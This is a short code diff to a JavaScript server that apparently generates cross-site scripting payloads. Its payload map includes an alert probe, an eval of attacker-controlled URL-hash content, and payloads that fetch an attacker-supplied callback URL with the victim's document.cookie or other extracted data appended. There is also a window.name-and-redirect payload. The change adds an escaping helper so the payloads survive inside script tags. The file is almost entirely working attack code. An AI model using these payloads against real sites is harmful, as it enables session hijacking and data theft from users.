@@ -101,6 +101,8 @@ function getFullURL(req) {
     return new URL(`${protocol}://${host}${req.originalUrl}`);
 }
 
+const jsonify = (...args) => JSON.stringify(...args).replaceAll('</script', '<\\/script');
+
 const PAYLOADS = new Map(Object.entries({
     default: 'alert(origin)',
     hash: 'eval(decodeURIComponent(location.hash.slice(1)))',
@@ -114,7 +116,7 @@ const PAYLOADS = new Map(Object.entries({
             callback = url.toString();
         }
 
-        return `fetch(${JSON.stringify(callback)}+'?data='+escape(document.cookie))`;
+        return `fetch(${jsonify(callback)}+'?data='+escape(document.cookie))`;
     },
     fetch(req) {
         let callback;
@@ -133,11 +135,11 @@ const PAYLOADS = new Map(Object.entries({
             extract = 'document.cookie';
         }
 
-        return `fetch(${JSON.stringify(callback)}+'?data='+escape(${extract}))`;
+        return `fetch(${jsonify(callback)}+'?data='+escape(${extract}))`;
     },
     name(req) {
         const { name, url } = req.query;
-        return `window.name=${JSON.stringify(name)};location.href=${JSON.stringify(url)}`;
+        return `window.name=${jsonify(name)};location.href=${jsonify(url)}`;
     },
 }));
 
